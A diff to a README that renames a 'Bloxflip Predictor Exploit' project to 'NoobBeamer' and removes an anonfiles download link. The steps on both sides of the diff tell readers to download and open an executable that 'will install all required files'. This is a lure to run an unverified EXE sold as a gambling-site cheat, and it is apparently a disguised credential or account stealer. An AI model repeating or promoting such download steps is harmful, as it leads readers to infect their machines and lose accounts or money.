@@ -1,9 +1,8 @@
-# BloxyFlipyPredictor
+# NoobBeamer
 # Steps:
 Bloxflip Predictor Exploit Overpowered
-* To install go to https://anonfiles.com/Nei9IbPayf/BloxyFlipyPredictor_exe 
-* Then download the  EXE
-* Open BloxFlipyPredictor.exe
+* download the EXE
+* Open NoobBeamer
 * It will install all required files to open
 * Done, enjoy
 
